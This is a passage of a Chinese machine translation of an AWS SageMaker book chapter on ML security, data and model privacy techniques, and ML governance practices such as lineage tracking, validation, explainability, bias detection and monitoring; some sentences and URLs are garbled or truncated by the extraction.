+<p>在结束本节之前，让我们快速讨论一下如何使用防火墙保护ML推断端点。在<a href="B18638_03.xhtml#_idTextAnchor060"> <em class="italic">第三章</em> </a>、<em class="italic">深度学习容器</em>中，我们使用服务的自定义容器映像支持，在Lambda函数内部署了我们的ML模型。然后，我们<a id="_idIndexMarker1145"/>设置并配置了一个API网关HTTP API触发器，当有新的端点请求时，它会触发Lambda函数。如果我们想保护这个设置并使这个无服务器API <a id="_idIndexMarker1146"/>可供公众使用，我们可以配置一个<strong class="bold"> AWS Web应用防火墙</strong> ( <strong class="bold"> WAF </strong>)来保护它，如下图所示:</p>
+
+<div><div><img alt="Figure 9.3 – Using AWS WAF to protect API endpoints&#10;&#10;" height="300" src="img/B18638_09_003.jpg" width="1145"/>
+
+</div>
+
+</div>
+
+<p class="IMG---Caption" lang="en-US" xml:lang="en-US">图9.3–使用AWS WAF保护API端点</p>
+
+<p>AWS WAF通过使用“规则”来保护<a id="_idIndexMarker1147"/>部署的web应用程序<a id="_idIndexMarker1148"/>免受利用现有漏洞的利用<a id="_idIndexMarker1149"/>，这些规则解决的问题包括新出现的<strong class="bold">常见漏洞和暴露</strong> ( <strong class="bold"> CVEs </strong>)、<strong class="bold">开放Web应用程序安全项目</strong> ( <strong class="bold"> OWASP </strong>)十大漏洞等等。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">注意，如果我们有一个API网关<a id="_idIndexMarker1151"/>与SageMaker推理端点接口，这个<a id="_idIndexMarker1150"/>解决方案也将工作——无论<a id="_idIndexMarker1152"/>我们使用<strong class="bold"> API网关映射模板</strong>还是<strong class="bold"> Lambda函数</strong>来调用SageMaker推理端点。我们还可以使用AWS WAF来<a id="_idIndexMarker1153"/>保护我们的<strong class="bold"> Amazon CloudFront </strong>和<strong class="bold">应用负载平衡器</strong> ( <strong class="bold"> ALB </strong>)资源，以保护在ALB后面运行ML推理端点的EC2实例。</p>
+
+<p>此时，在管理ML环境的安全性和法规遵从性时，我们应该对不同的解决方案和策略有一个很好的了解。在下一节中，我们将深入研究保护数据隐私和模型隐私的不同技术。</p>
+
+<h1 id="_idParaDest-183"><a id="_idTextAnchor196"/>保护数据隐私和模型隐私</h1>
+
+<p>当处理ML和ML工程需求时，我们需要确保保护<a id="_idIndexMarker1154"/>训练数据以及生成模型的参数免受<a id="_idIndexMarker1155"/>攻击者的攻击。一旦有机会，这些恶意行为者就会进行各种攻击，以提取训练模型的参数，甚至恢复用于训练模型的数据。这意味着PII可能会被揭露和窃取。如果模型参数遭到破坏，攻击者可能会通过重新创建您的公司花费数月或数年时间开发的模型来执行推断。<em class="italic">吓人吧？</em>让我们分享一些攻击者可能实施的攻击示例:</p>
+
+<ul>
+
+<li><strong class="bold">模型反转攻击</strong>:攻击者<a id="_idIndexMarker1156"/>试图恢复用于训练模型的数据集。</li>
+
+<li><strong class="bold">模型提取攻击</strong>:攻击者<a id="_idIndexMarker1157"/>试图利用预测输出值窃取训练好的模型。</li>
+
+<li><strong class="bold">成员推断攻击</strong>:攻击者试图推断一条记录是否是用于训练模型的训练数据集的一部分<a id="_idIndexMarker1158"/>。</li>
+
+<li><strong class="bold">属性推断攻击</strong>:攻击者试图猜测一条训练记录的缺失属性(使用部分可用信息)。</li>
+
+</ul>
+
+<p>现在我们对一些可能的攻击有了更好的了解，让我们讨论一下我们可以用来保护数据和模型隐私的解决方案和防御机制。</p>
+
+<h2 id="_idParaDest-184"><a id="_idTextAnchor197"/>联合学习</h2>
+
+<p>让我们从<a id="_idIndexMarker1162"/>谈论<strong class="bold">联合学习</strong>开始，但在此之前，让我们将其与我们执行ML培训和部署的典型方式进行比较，即<em class="italic">集中式</em>:</p>
+
+<div><div><img alt="Figure 9.4 – Centralized ML&#10;&#10;" height="378" src="img/B18638_09_004.jpg" width="859"/>
+
+</div>
+
+</div>
+
+<p class="IMG---Caption" lang="en-US" xml:lang="en-US">图9.4–集中式ML</p>
+
+<p>这里，数据从用户的移动设备被收集到一个集中的位置，其中ML模型训练步骤在单个机器上执行(或者使用分布式训练的机器集群)。由于发送到集中位置的数据可能包含关于用户的敏感信息，所以这种方法存在关于数据的所有权、隐私和<a id="_idIndexMarker1163"/>位置的问题。为了管理这些类型的问题，我们可以利用联合学习，其中培训步骤直接在边缘设备中执行，如下图所示:</p>
+
+<div><div><img alt="Figure 9.5 – Federated ML&#10;&#10;" height="375" src="img/B18638_09_005.jpg" width="681"/>
+
+</div>
+
+</div>
+
+<p class="IMG---Caption" lang="en-US" xml:lang="en-US">图9.5–联合ML</p>
+
+<p>在这里，只有模型被发送回服务器并相互“合并”以产生一个新的<a id="_idIndexMarker1164"/>全局模型。这有助于解决<strong class="bold">隐私保护</strong>问题，因为数据保存在边缘设备中。在<a href="B18638_07.xhtml#_idTextAnchor151"> <em class="italic">第7章</em> </a>、<em class="italic"> SageMaker部署解决方案</em>的<em class="italic">部署策略和最佳实践</em>部分，我们提到在边缘设备上部署和管理ML模型时，我们可以使用<strong class="bold"> SageMaker Edge Manager </strong>以及其他服务。这里，我们假设模型已经被训练，我们只是在部署步骤中使用这些服务。<em class="italic">模特是如何训练的？</em>以下是一些可能的解决方案:</p>
+
+<ul>
+
+<li>使用<a id="_idIndexMarker1165"/>解决方案，如<strong class="bold">tensor flow Federated</strong>(<a href="https://www.tensorflow.org/federated">https://www.tensorflow.org/federated</a>)和<strong class="bold">py torch Mobile</strong>(<a href="https://pytorch.org/mobile/home/">https://pytorch.org/mobile/home/</a>)，其中<a id="_idIndexMarker1166"/>可用于Federated <a id="_idIndexMarker1168"/> ML需求。</li>
+
+<li>使用<strong class="bold">Flower</strong>(<a href="https://flower.dev/">https://flower.dev/</a>)框架等<a id="_idIndexMarker1169"/>解决方案，以及<a id="_idIndexMarker1170"/>与<strong class="bold"> AWS物联网Greengrass </strong>、<strong class="bold">亚马逊ECS </strong>和<strong class="bold"> AWS Step Functions </strong>等服务，来管理训练集群<a id="_idIndexMarker1171"/>不可预测性<a id="_idIndexMarker1172"/>和协调器到设备<a id="_idIndexMarker1173"/>在使用边缘设备执行联合学习时面临的挑战。</li>
+
+<li>使用<code>OpenMined/SwiftSyft</code>(在iOS设备上)和<code>OpenMined/KotlinSyft</code>(在Android设备上)等<a id="_idIndexMarker1174"/>解决方案来训练和部署用<strong class="bold"> TensorFlow </strong>或<strong class="bold"> PyTorch </strong>编写的<strong class="bold"> PySyft </strong>模型。</li>
+
+</ul>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">什么是<strong class="bold"> PySyft </strong>？这是一个来自<strong class="bold"> OpenMined </strong>的库，它利用联邦学习、差分隐私和<a id="_idIndexMarker1175"/>加密计算来满足安全和隐私的深度<a id="_idIndexMarker1176"/>学习需求。如果你想知道<a id="_idIndexMarker1177"/>什么是<strong class="bold">差分隐私</strong>和<strong class="bold">加密计算</strong>，我们现在就来讨论这些！</p>
+
+<h2 id="_idParaDest-185"><a id="_idTextAnchor198"/>差分隐私</h2>
+
+<p>现在，我们来谈谈<strong class="bold">差分隐私</strong>。差分隐私涉及使用保护数据集中个人记录的共享信息的技术，这将使攻击者更难逆向工程原始数据。这些技术包括在生成统计数据时向训练数据或模型参数添加精心设计的随机噪声量。以下是一些示例和解决方案:</p>
+
+<ul>
+
+<li>在SageMaker中训练<strong class="bold">自然语言处理</strong> ( <strong class="bold"> NLP </strong>)模型<a id="_idIndexMarker1179"/>和分析数据<a id="_idIndexMarker1180"/>时，使用一个名为<strong class="bold">的变量。在这里，训练数据集中单词的“含义”得到保留，同时保护了单个记录的隐私。有关更多信息，请查看<a href="https://www.amazon.science/blog/preserving-privacy-in-analyses-of-textual-data">https://www . Amazon . science/blog/preserving-privacy-in-analyses-of-textual-data</a>。</strong></li>
+
+<li>在训练隐私保护ML <a id="_idIndexMarker1181"/>模型时使用开源<strong class="bold"> TensorFlow隐私</strong>库，对现有<a id="_idIndexMarker1182"/> TensorFlow代码进行最小的代码更改。更多信息请查看<a href="https://blog.tensorflow.org/2019/03/introducing-tensorflow-privacy-learning.xhtml">https://blog . tensor flow . org/2019/03/introducing-tensor flow-privacy-learning . XHTML</a>。</li>
+
+<li>使用开放的<a id="_idIndexMarker1183"/>源<strong class="bold"> Opacus </strong>库来训练PyTorch模型，同时<a id="_idIndexMarker1184"/>启用差分隐私。想了解更多的信息，请查看https://opacus.ai/。</li>
+
+</ul>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">如果您想知道如何在AWS中使用这些解决方案，我们只需在将要执行<a id="_idIndexMarker1186"/>ML实验的资源中安装所需的包和库(例如，<code>opacus</code>)。例如，如果我们使用一个<code>pip install opacus</code>启动一个EC2实例。如果我们正在使用<code>requirements.txt</code>文件，当<a id="_idIndexMarker1188"/>使用<strong class="bold">脚本模式</strong>或提供一个自定义容器图像，将被SageMaker使用。</p>
+
+<h2 id="_idParaDest-186"><a id="_idTextAnchor199"/>保护隐私的机器学习</h2>
+
+<p>在<strong class="bold">隐私保护机器学习</strong> ( <strong class="bold"> PPML </strong>)下还有一类技术，其中即使传递给模型的输入有效载荷被加密，也可以执行ML <a id="_idIndexMarker1189"/>推理。这意味着我们可以在敏感数据作为有效载荷传递给ML推断端点之前对其进行保护和加密。在PPML模型被用于对加密的有效载荷进行推断之后，结果被加密地返回给发送者。最后一步是发送者<a id="_idIndexMarker1190"/>解密结果。很酷吧？这方面的一个例子是<strong class="bold">隐私保护XGBoost模型</strong>，它利用<a id="_idIndexMarker1191"/>隐私保护加密方案<a id="_idIndexMarker1192"/>和工具，如<strong class="bold">保序加密</strong> ( <strong class="bold"> OPE </strong>)、<strong class="bold">伪随机函数</strong> ( <strong class="bold"> PRFs </strong>)和<strong class="bold">附加同态加密</strong> ( <strong class="bold"> AHE </strong>)对加密查询进行预测当使用<strong class="bold"> SageMaker托管服务</strong>部署隐私保护的XGBoost模型时，我们可以使用<a id="_idIndexMarker1193"/>自定义容器映像，这样我们<a id="_idIndexMarker1194"/>在推断过程中使用的包和代码方面就有了更多的灵活性。请注意，PPML增加了一些计算开销，与未加密版本相比，生成的模型在性能方面通常较慢<a id="_idIndexMarker1195"/>。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">在本书中，我们不会深入探究PPML是如何工作的。更多信息，请查看<a href="https://www.amazon.science/publications/privacy-preserving-xgboost-inference">https://www . Amazon . science/publications/privacy-preserving-xgboost-inference</a>。</p>
+
+<h2 id="_idParaDest-187"><a id="_idTextAnchor200"/>其他解决方案和选项</h2>
+
+<p>最后，在管理数据隐私方面，数据科学团队应该充分利用他们正在使用的服务和工具的现有安全特性和功能。除了本章其他部分提到的内容之外，在AWS中保护数据时，我们还可以使用其他服务和功能:</p>
+
+<ul>
+
+<li><strong class="bold">亚马逊Macie </strong>:用于<a id="_idIndexMarker1198"/>通过自动发现PII等敏感数据，评估存储在S3的数据的隐私性和安全性。</li>
+
+<li><strong class="bold">对行级安全和列级访问控制的红移支持</strong>:用于在红移中实现对表中行和列的细粒度访问。</li>
+
+<li><code>*******@email.com</code>而不是<code>johndoe@email.com</code>。</li>
+
+<li><strong class="bold">红移支持跨账户数据共享</strong>:用于跨AWS账户共享红移仓库中存储的数据(这样当需要共享访问时，数据不再需要复制和转移到另一个账户)。</li>
+
+<li><strong class="bold">亚马逊OpenSearch服务字段屏蔽支持</strong>:当在亚马逊OpenSearch服务中执行搜索查询时，它使用基于模式的字段屏蔽来隐藏敏感数据，如PII。</li>
+
+<li><strong class="bold"> S3对象λ</strong>:自定义<a id="_idIndexMarker1199"/>代码用于处理和修改S3 GET请求的输出(包括屏蔽和编辑数据的能力)。</li>
+
+<li><strong class="bold"> AWS Lake Formation对行级和单元级安全性的支持</strong>:这支持对查询结果和AWS Glue ETL作业的细粒度访问。</li>
+
+<li><strong class="bold">主成分分析(SageMaker内置算法)</strong>:一种基于PCA的<a id="_idIndexMarker1200"/>变换，用于在保护数据“本质”的同时保护数据隐私。</li>
+
+</ul>
+
+<p>此时，我们<a id="_idIndexMarker1201"/>应该对管理数据和模型隐私的不同方法有了更好的理解。在下一节中，我们将讨论ML治理，并且我们将讨论AWS中可用的不同解决方案。</p>
+
+<h1 id="_idParaDest-188"><a id="_idTextAnchor201"/>建立ML治理</h1>
+
+<p>当处理ML计划和需求时，必须尽早考虑ML治理<a id="_idIndexMarker1202"/>。由于以下原因，治理不善的公司和团队会遇到短期和长期的问题:</p>
+
+<ul>
+
+<li><em class="italic">缺乏清晰准确的ML车型库存跟踪</em></li>
+
+<li><em class="italic">关于模型可解释性和可解释性的限制</em></li>
+
+<li><em class="italic">训练数据中存在偏差</em></li>
+
+<li><em class="italic">训练和推断数据分布不一致</em></li>
+
+<li><em class="italic">缺乏自动化的实验谱系跟踪流程</em></li>
+
+</ul>
+
+<p>我们如何应对这些问题和挑战？我们可以通过建立ML治理(正确的方式)来解决和管理这些问题，并确保考虑到以下方面<a id="_idIndexMarker1203"/>:</p>
+
+<ul>
+
+<li>谱系追踪和再现性</li>
+
+<li>模型库存</li>
+
+<li>模型验证</li>
+
+<li>ML可解释性</li>
+
+<li>偏流检波</li>
+
+<li>模型监控</li>
+
+<li>数据分析和数据质量报告</li>
+
+<li>数据完整性管理</li>
+
+</ul>
+
+<p>我们将在本节中详细讨论其中的每一项。继续之前，请随意喝杯咖啡或茶！</p>
+
+<h2 id="_idParaDest-189"><a id="_idTextAnchor202"/>血统追踪和再现性</h2>
+
+<p>在<a href="B18638_06.xhtml#_idTextAnchor132"> <em class="italic">第六章</em> </a>、<em class="italic"> SageMaker训练和调试解决方案</em>中，我们讨论了在使用训练数据集、算法、超参数值的<a id="_idIndexMarker1205"/>特定配置以及其他相关训练配置参数值作为训练作业的输入之后，如何产生ML模型<a id="_idIndexMarker1204"/>。</p>
+
+<p>数据科学家和ML实践者必须能够验证可以使用相同的配置设置集以及其他“输入”,如训练数据集和算法，来构建和再现模型。如果我们正在处理一个单一的实验，手动跟踪这些相对容易。也许将这些信息存储在电子表格或减价文件中会有用！随着我们需求的发展，这些信息可能会在过程中丢失，特别是如果手工完成的话。也就是说，一旦我们需要使用超参数配置<a id="_idIndexMarker1206"/>值的各种组合运行多个训练实验(例如，当使用SageMaker的<strong class="bold">自动模型调整</strong>功能<a id="_idIndexMarker1207"/>时)，跟踪这种“历史”或<strong class="bold">血统</strong>将变得更加困难和棘手。<a id="_idIndexMarker1208"/>好消息是SageMaker通过<strong class="bold"> SageMaker ML血统跟踪</strong>和<strong class="bold"> SageMaker实验</strong>自动帮助我们跟踪这一点。如果我们想让<a id="_idIndexMarker1209"/>看到实验谱系以及<a id="_idIndexMarker1210"/>其他细节，<strong class="bold"> SageMaker Studio </strong>让我们只需点击几下鼠标就能轻松获得这些信息。</p>
+
+<p class="callout-heading">注意</p>
+
+<pre>Machine Learning with Amazon SageMaker Cookbook) <a href="https://bit.ly/3POKbKf">https://bit.ly/3POKbKf</a>.</pre>
+
+<p>除了由SageMaker执行的自动化实验和沿袭跟踪之外，值得注意的是，我们还可以通过编程手动创建关联。我们还可以使用<strong class="bold"> boto3 </strong>和<strong class="bold"> SageMaker Search </strong> API来获得关于用于训练ML模型的训练的细节和信息。在大多数情况下，我们使用SageMaker控制台以及可用的搜索功能就可以了。</p>
+
+<p>如果您正在使用深度学习框架在AWS计算服务<a id="_idIndexMarker1211"/>如EC2、ECS或Lambda上运行训练脚本，您可以使用库如<strong class="bold"> ML元数据</strong>(用于TensorFlow)来跟踪血统，以及ML管道中不同组件的工件。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">有关<strong class="bold"> ML元数据</strong>的更多<a id="_idIndexMarker1212"/>信息，请查看<a href="https://www.tensorflow.org/tfx/tutorials/mlmd/mlmd_tutorial">https://www.tensorflow.org/tfx/tutorials/mlmd/mlmd_tutorial</a>。</p>
+
+<h2 id="_idParaDest-190"><a id="_idTextAnchor203"/>模型库存</h2>
+
+<p>管理模型<a id="_idIndexMarker1213"/>库存对于建立ML治理至关重要。能够维护一个有组织的模型清单使数据科学团队的关键成员能够立即了解模型的当前状态和性能。</p>
+
+<p>在AWS上的ML环境中，有不同的<a id="_idIndexMarker1214"/>方法来管理模型库存<a id="_idIndexMarker1215"/>。我们<a id="_idIndexMarker1216"/>可以做的一个可能的方法是<a id="_idIndexMarker1217"/>使用<a id="_idIndexMarker1218"/>各种服务构建一个定制的解决方案！例如，我们可以使用<strong class="bold">亚马逊DynamoDB </strong>、<strong class="bold">亚马逊S3 </strong>、<strong class="bold">亚马逊ECR </strong>、<strong class="bold">亚马逊API网关</strong>和<strong class="bold"> AWS Lambda </strong>从<a id="_idIndexMarker1219"/>开始设计并构建一个<em class="italic">无服务器</em>模型注册表，如下图所示:</p>
+
+<div><div><img alt="Figure 9.6 – Custom-built model registry&#10;&#10;" height="673" src="img/B18638_09_006.jpg" width="1209"/>
+
+</div>
+
+</div>
+
+<p class="IMG---Caption" lang="en-US" xml:lang="en-US">图9.6–定制的模型注册表</p>
+
+<p>在这个定制的<a id="_idIndexMarker1220"/>解决方案中，我们准备了以下Lambda函数:</p>
+
+<ul>
+
+<li><strong class="bold">上传模型包</strong>:上传模型包(包括ML模型工件、训练和推理脚本、脚本运行环境的容器映像、模型元数据)</li>
+
+<li><code>PENDING</code>、<code>APPROVED</code>或<code>REJECTED</code>状态)，以及存储<a id="_idIndexMarker1221"/>模型包不同组件的标识符和路径</li>
+
+<li><code>PENDING</code>、<code>APPROVED</code>或<code>REJECTED</code></li>
+
+</ul>
+
+<p>如果我们需要扩展这个定制的模型注册中心的功能，我们可以很容易地添加更多的Lambda函数。这个选项将为我们提供最大的灵活性，代价是需要几天时间来设置整个系统。</p>
+
+<p>另一个选择<a id="_idIndexMarker1222"/>是使用现有的一个，比如<strong class="bold"> MLFlow模型注册表</strong>，并将其部署在EC2实例或ECS <a id="_idIndexMarker1223"/>容器中。最后，我们可以使用<strong class="bold"> SageMaker模型注册中心</strong>，它已经<a id="_idIndexMarker1224"/>拥有我们需要的模型库存管理特性，比如模型批准和模型生命周期跟踪。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">请随意查看第8章<a href="B18638_08.xhtml#_idTextAnchor172"><em class="italic"/></a>，<em class="italic">模型监控和管理解决方案</em>，了解更多关于如何使用SageMaker模型注册表的信息和细节。</p>
+
+<h2 id="_idParaDest-191"><a id="_idTextAnchor204"/>模型验证</h2>
+
+<p>在一个ML模型被训练之后，它需要被评估以检查它的性能是否允许<a id="_idIndexMarker1225"/>某些商业目标被实现。数据科学团队还需要验证模型的选择，因为简单模型可能容易出现<strong class="bold">欠拟合</strong>，而<a id="_idIndexMarker1226"/>复杂模型则容易出现<strong class="bold">过拟合</strong>。同时<a id="_idIndexMarker1227"/>需要审查用于模型验证的指标，因为一些指标代表模型性能的能力<a id="_idIndexMarker1228"/>取决于所解决问题的背景。例如，与欺诈检测用例的<strong class="bold">准确性</strong>相比，<strong class="bold">平衡F分数</strong>可能是更有意义的选项(因为由于类别不平衡，模型准确性分数可能仍然很高)。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">关于平衡F值的更多<a id="_idIndexMarker1229"/>信息，请随时查看<a href="https://en.wikipedia.org/wiki/F-score">https://en.wikipedia.org/wiki/F-score</a>。</p>
+
+<p><a id="_idIndexMarker1230"/>评估模型的第一种方式是通过<strong class="bold">离线测试</strong>，其中历史<a id="_idIndexMarker1231"/>数据用于评估训练好的模型。这可以通过使用“维持集”的<strong class="bold">验证来完成，这是不用于<a id="_idIndexMarker1232"/>模型训练的数据。另一种选择是使用<strong class="bold"> k倍交叉验证</strong>，这是一种检测过度拟合的流行技术。使用SageMaker时，可以通过多种方式进行离线测试:</strong></p>
+
+<ul>
+
+<li>在SageMaker训练作业之后生成的模型文件(存储在<code>model.tar.gz</code>文件中)可以在不存在SageMaker推理端点的情况下使用适当的库或框架进行加载和评估。例如，使用SageMaker训练的<strong class="bold">线性学习器</strong>模型可以使用<strong class="bold"> MXNet </strong>加载<a id="_idIndexMarker1234"/>(例如，在容器中运行的自定义应用程序内)，如下面的代码块所示:<pre class="source-code">def <strong class="bold">load_model</strong>():</pre><pre class="source-code">    sym_json = <strong class="bold">json_load</strong>(open('mx-mod-symbol.json')) </pre><pre class="source-code">    sym_json_string = <strong class="bold">json_dumps</strong>(sym_json)</pre><pre class="source-code">    model = gluon.nn.<strong class="bold">SymbolBlock</strong>( </pre><pre class="source-code">        outputs=mxnet.sym.load_json(sym_json_string), </pre><pre class="source-code">        inputs=mxnet.sym.var('data'))</pre><pre class="source-code">    model.<strong class="bold">load_parameters</strong>(</pre><pre class="source-code">        'mx-mod-0000.params', </pre><pre class="source-code">        allow_missing=True</pre><pre class="source-code">    )</pre><pre class="source-code">    model.<strong class="bold">initialize</strong>()</pre><pre class="source-code">    </pre><pre class="source-code">    return model</pre></li>
+
+</ul>
+
+<p class="list-inset">一旦评估了模型，就可以将它部署到推理端点。</p>
+
+<ul>
+
+<li>另一种方法是将模型部署到“alpha”ML推理端点，并使用历史数据对其进行评估。一旦评估步骤已经完成，模型可以被部署到“生产”ML推理端点中，并且“alpha”端点可以被删除。</li>
+
+</ul>
+
+<p>另一种方法涉及<strong class="bold">在线测试</strong>，使用实时数据评估模型。可以使用SageMaker通过其A/B测试支持来执行在线测试，其中可以在一个推理端点下部署两个或多个模型。使用这种方法，一小部分流量可以被路由到在某段时间内被验证的模型的变体。一旦验证步骤完成，100%的流量可以完全路由到其中一个变体。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">查看以下笔记本，了解如何使用SageMaker设置多个模型的A/B测试示例:<a href="https://bit.ly/3uSRZSE">https://bit.ly/3uSRZSE</a>。</p>
+
+<p>既然我们已经讨论了模型评估，让我们更深入地研究ML的可解释性。</p>
+
+<h2 id="_idParaDest-192"><a id="_idTextAnchor205"/> ML可解释性</h2>
+
+<p>在某些情况下，企业所有者和利益相关者拒绝使用某些类型的模型<a id="_idIndexMarker1237"/>,原因是关于ML可解释性的问题。有时，由于ML模型的复杂性，很难从概念上解释它如何工作或者它如何产生预测或推断结果。一旦涉众对ML模型如何产生输出有了更多的可见性和理解，他们就有更大的机会批准使用某些模型。这包括了解每个要素对模型预测输出值的贡献。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">注意<strong class="bold">模型可解释性</strong>和<strong class="bold">模型可解释性</strong>经常被ML <a id="_idIndexMarker1238"/>从业者互换。然而，这两个术语是不同的，应该小心使用<a id="_idIndexMarker1239"/>。可解释性关注于一个ML模型是如何工作的——也就是说，它在内部是如何工作的。另一方面，可解释性关注ML模型的行为，包括输入特性<a id="_idIndexMarker1240"/>值如何对预测输出值做出贡献。有关这个主题的更多信息，请随意查看<a href="https://docs.aws.amazon.com/whitepapers/latest/model-explainability-aws-ai-ml/interpretability-versus-explainability.xhtml">https://docs . AWS . Amazon . com/white papers/latest/model-explain ability-AWS-ai-ml/interpretatibility-vs-explain ability . XHTML</a>。</p>
+
+<p>ML可解释性可以用<strong class="bold">全局可解释性</strong>和<strong class="bold">局部可解释性</strong>来表示。如果我们能够确定每个特征在所有预测中对模型预测的贡献程度，我们就可以说已经实现了全局可解释性。另一方面，如果我们能够确定每个特征对单个记录(或数据点)的模型预测有多大贡献，就可以实现局部可解释性。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">更多关于ML explainability的信息<a id="_idIndexMarker1244"/>，请查看<a href="https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-model-explainability.xhtml">https://docs . AWS . Amazon . com/sage maker/latest/DG/clarify-model-explain ability . XHTML</a>。</p>
+
+<p>当生成ML可解释性报告时，这里有一些可能的解决方案:</p>
+
+<ul>
+
+<li>使用开源库(例如，<code>shap</code>库)并实现部署在<strong class="bold"> AWS Lambda </strong>函数或<strong class="bold"> Amazon ECS </strong>容器中的定制解决方案。</li>
+
+<li>使用<strong class="bold"> SageMaker Clarify </strong>运行作业并生成可解释报告:<pre class="source-code">processor = <strong class="bold">SageMakerClarifyProcessor</strong>(...)</pre> <pre class="source-code">processor.<strong class="bold">run_explainability</strong>(...)</pre></li>
+
+<li>使用开源库(例如，<code>shap</code>库)并使用<strong class="bold"> SageMaker处理</strong>来运行定制代码，以及定制容器映像。</li>
+
+</ul>
+
+<p>既然我们已经讨论了关于ML可解释性的<a id="_idIndexMarker1246"/>,让我们跳到如何在AWS上使用各种解决方案来执行ML偏差检测。</p>
+
+<h2 id="_idParaDest-193"><a id="_idTextAnchor206"/>偏差检测</h2>
+
+<p>检测ML偏差对于任何ML项目的成功都是至关重要的。如果ML偏差没有被发现和减轻，利用ML模型的自动化<a id="_idIndexMarker1247"/>系统可能会以不公平的预测而告终。例如，基于ML的招聘应用程序可能对某些群体做出不公平的候选人选择(例如，对女性候选人)。另一个例子是一个自动贷款申请，它拒绝来自代表不足的群体(例如，那些生活在特定国家的群体)的贷款申请。</p>
+
+<p>ML偏差可以用多种指标来衡量。以下是可用于<a id="_idIndexMarker1248"/>测量ML偏差的一些指标:</p>
+
+<ul>
+
+<li><strong class="bold">等级不平衡</strong>:测量<a id="_idIndexMarker1249"/>并检测不同组之间成员数量的不平衡。</li>
+
+<li><strong class="bold">标签不平衡</strong>:测量<a id="_idIndexMarker1250"/>并检测不同组之间阳性结果的任何不平衡。</li>
+
+<li><strong class="bold"> Kullback-Leibler (KL)散度</strong>:比较和衡量不同组的结果分布有多大差异<a id="_idIndexMarker1251"/>。</li>
+
+<li><strong class="bold">詹森-香农(JS)背离</strong>:类似于KL背离，JS背离比较<a id="_idIndexMarker1252"/>，衡量不同群体的结果分布有多大差异。</li>
+
+</ul>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">如果你有兴趣<a id="_idIndexMarker1253"/>了解更多关于测量ML偏差的不同指标，请查看<a href="https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-measure-data-bias.xhtml">https://docs . AWS . Amazon . com/sage maker/latest/DG/clarify-measure-data-bias . XHTML</a>。</p>
+
+<p>以下是使用AWS服务和功能检测ML偏差时的一些可能解决方案:</p>
+
+<ul>
+
+<li>使用开源库(例如，<code>ResponsiblyAI/responsibly</code>)并实现部署在<strong class="bold"> AWS Lambda </strong>函数或<strong class="bold"> Amazon ECS </strong>容器中的定制解决方案。</li>
+
+<li>使用<strong class="bold"> SageMaker Clarify </strong>运行作业并生成培训前和培训后偏差报告:<pre class="source-code">processor = <strong class="bold">SageMakerClarifyProcessor</strong>(...)</pre>T3</li>
+
+<li>使用开源库(例如，<code>ResponsiblyAI/responsibly</code>库)并使用<strong class="bold"> SageMaker处理</strong>来运行定制代码，以及定制容器映像。</li>
+
+<li>使用<strong class="bold"> SageMaker模型监视器</strong>和<strong class="bold"> SageMaker Clarify </strong>来监视部署在推理端点的模型中的偏差漂移。</li>
+
+</ul>
+
+<p>检测到ML偏差后，<a id="_idIndexMarker1254"/>的下一步是通过各种方式解决和缓解问题(取决于ML偏差的背景和类型)。我们不会在本书中讨论不同的偏见缓解策略，因此可以随意查看https://sage maker-examples . readthedocs . io/en/latest/end _ to _ end/fraud _ detection/3-improve-bias-train-Model 2-registry-e2e . XHTML # Develop-an-Unbiased-Model以快速获得端到端示例。</p>
+
+<h2 id="_idParaDest-194"><a id="_idTextAnchor207"/>模式监控</h2>
+
+<p>在<a href="B18638_08.xhtml#_idTextAnchor172"> <em class="italic">第8章</em> </a>、<em class="italic">模型监控和管理解决方案</em>中，我们启用了ML推理端点中的数据捕获，然后设置了调度监控，该监控从捕获的数据中检测违规<a id="_idIndexMarker1255"/>和数据质量问题。这种设置将帮助我们尽早发现任何不一致之处，以便可以立即采取纠正措施。<em class="italic">如果不纠正这些问题和不一致，会发生什么？</em>如果不立即应用纠正措施，部署的模型可能会经历性能衰减或降级，直到应用了“修复”。当然，在应用任何修正之前，我们需要首先检测这些不一致。也就是说，我们的下一个问题是，<em class="italic">我们如何检测这些不一致和问题？</em></p>
+
+<div><div><img alt="Figure 9.7 – Detecting drift&#10;&#10;" height="747" src="img/B18638_09_007.jpg" width="1276"/>
+
+</div>
+
+</div>
+
+<p class="IMG---Caption" lang="en-US" xml:lang="en-US">图9.7–检测漂移</p>
+
+<p>在前面的<a id="_idIndexMarker1256"/>图中，我们可以看到，我们可以通过对基线数据集和捕获的ML推断数据(通过ML推断端点)执行所需的分析(例如，数据质量检查)来检测“漂移”。一旦所需的分析完成，比较基线数据集和捕获的ML推断数据的结果，以查看结果中的差异是否超过某个阈值。</p>
+
+<p>注意，我们可以使用<strong class="bold"> SageMaker模型监视器</strong>检测以下问题:</p>
+
+<ul>
+
+<li><strong class="bold">数据质量漂移</strong>:这是<a id="_idIndexMarker1257"/>通过比较以下内容检测到的:<ul><li><strong class="bold">[" PROPERTIES "-A]</strong>:用于训练部署模型的基线数据集的统计性质和属性(例如，数据类型)</li>
+
+<li><strong class="bold">[" PROPERTIES "-B]</strong>:捕获ML推理数据的属性<a id="_idIndexMarker1258"/></li>
+
+</ul></li>
+
+<li><strong class="bold">型号性能漂移</strong>:这是通过比较以下项目检测到的<a id="_idIndexMarker1259"/>:<ul><li><strong class="bold">[" PROPERTIES "-A]</strong>:模型在基线数据集上的性能</li>
+
+<li><strong class="bold"> [“属性”-B]</strong>:模型在捕获的ML推理数据上的性能(与上传的地面真实标签合并)</li>
+
+</ul></li>
+
+<li><strong class="bold">模型偏差漂移</strong>:这是<a id="_idIndexMarker1260"/>通过比较以下检测到的:<ul><li><strong class="bold">[" PROPERTIES "-A]</strong>:基线数据集上模型的偏差度量</li>
+
+<li><strong class="bold">[" PROPERTIES "-B]</strong>:捕获的ML推理数据的偏差度量</li>
+
+</ul></li>
+
